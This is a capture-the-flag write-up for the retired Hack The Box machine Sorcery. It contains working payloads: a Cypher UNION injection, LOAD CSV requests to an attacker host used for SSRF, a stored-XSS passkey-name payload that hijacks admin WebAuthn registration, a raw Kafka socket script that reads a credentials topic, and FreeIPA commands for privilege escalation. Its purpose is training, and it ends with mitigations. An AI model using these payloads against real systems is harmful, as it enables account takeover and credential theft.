---
machine: Sorcery
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, neo4j, cypher-injection, webauthn, kafka, freeipa]
---

# Sorcery — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Four modern layers chained: **Cypher injection** in a **Neo4j**-backed app, **stored XSS in WebAuthn passkey registration** to attach your own authenticator to the admin account, raw **Kafka wire protocol** to slip past an HTTP proxy, and a misconfigured **FreeIPA** for root. Each leg is rare alone; together they are the most realistic enterprise scenario of the season.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

```text
80/tcp    http   ("wizard" app)
7474/tcp  http   Neo4j
7687/tcp  bolt   Neo4j
8081/tcp  http   admin panel
9092/tcp  kafka  (filtered, only reachable through the proxy)
```

## 1. Cypher injection

```text
GET /api/wizard?name=Merlin
```

becomes, server-side:

```cypher
MATCH (w:Wizard {name: 'Merlin'}) RETURN w
```

Close the quote and UNION:

```text
/api/wizard?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```

```json
{"name":"<user>","token":"<registration token>"}
```

`LOAD CSV FROM 'http://<IP>:8000/x'` doubles as SSRF and as an egress check.

## 2. Passkeys: XSS in the credential name

`/admin/passkeys` renders `credential.name` unescaped. Register a credential named:

```html
<img src=x onerror="fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
 .then(r=>r.json()).then(c=>navigator.credentials.create({publicKey:c})
 .then(k=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(k)})))">
```

When the admin reviews the list, their browser registers **the attacker's authenticator** on their account. You now log in as admin with that passkey.

## 3. Kafka through the proxy

The broker (9092) is filtered, but the proxy forwards bytes when the first one looks like a Kafka request:

```python
import socket, struct
def req(api, ver, corr, cid, payload=b''):
    body  = struct.pack('>hhi', api, ver, corr)
    body += struct.pack('>h', len(cid)) + cid.encode() + payload
    return struct.pack('>i', len(body)) + body

s = socket.create_connection(('<IP>', 8081))
s.send(req(18, 0, 1, 'x'))      # ApiVersions
print(s.recv(4096))
```

With `ApiVersions` validated, request metadata (`ApiKey 3`), list topics and read `internal-creds` with `Fetch` (`ApiKey 1`). The message carries a service account's credentials.

## 4. FreeIPA to root

```bash
kinit svc-deploy
ipa-getkeytab -s ipa.sorcery.htb -p svc-deploy -k svc.keytab
ldapsearch -Y GSSAPI -H ldap://ipa.sorcery.htb -b "cn=groups,cn=accounts,dc=sorcery,dc=htb" | grep -i sudo
```

A FreeIPA sudo rule mapped to a group the service account belongs to allows `sudo -i` on the host, or running a writable script as root.

## Evidence (redacted)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- Graph databases get injected too: `MATCH ... {name: '$input'}` is no safer than concatenated SQL.
- **WebAuthn** does not help if registration can be started from XSS: the passkey becomes the attacker's.
- A proxy that validates "HTTP only" yet forwards arbitrary bytes exposes every binary protocol behind it.
- Mitigation: parameterised Neo4j queries, CSP plus escaping in the passkey panel with origin checks on registration, and real segmentation (no convenience proxies) for Kafka.
